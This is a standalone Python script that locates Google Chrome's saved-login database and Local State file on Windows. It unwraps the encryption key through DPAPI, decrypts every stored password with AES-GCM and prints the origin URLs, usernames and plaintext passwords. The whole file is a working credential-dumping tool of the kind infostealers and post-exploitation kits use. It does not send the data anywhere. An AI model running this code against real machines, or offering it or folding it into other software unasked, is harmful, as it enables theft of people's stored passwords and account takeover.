#pip3 install pycryptodome pypiwin32
import os
import sys
import json
import base64
import sqlite3
import win32crypt
import argparse
from Crypto.Cipher import AES
import shutil

def get_arguments():
	parser = argparse.ArgumentParser()
	parser.add_argument("-d", "--db", dest="dbFile", help="Path to the Chrome database file")
	parser.add_argument("-k", "--key", dest="localState", help="Path to the Chrome local state file")
	args = parser.parse_args()
	return args

def get_encryption_key(path):
    f = open(path, "r", encoding="utf-8").read()
    local_state = json.loads(f)
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return ""

def main():
    options = get_arguments()
    if not options.dbFile:
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
        filename = "ChromeDataTemp.db"
        shutil.copyfile(db_path, filename)
    else:
        filename = options.dbFile
    if not options.localState:
        local_state = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
    else:
        local_state = options.localState
    key = get_encryption_key(local_state)
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    for row in cursor.fetchall():
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = decrypt_password(row[3], key) 
        if username or password:
            print(f"Origin URL: {origin_url}")
            print(f"Action URL: {action_url}")
            print(f"Username: {username}")
            print(f"Password: {password}")
        else:
            continue
        print("="*50)
    cursor.close()
    db.close()
    try:
        os.remove("ChromeDataTemp.db")
    except:
        pass

if __name__ == "__main__":
    main()
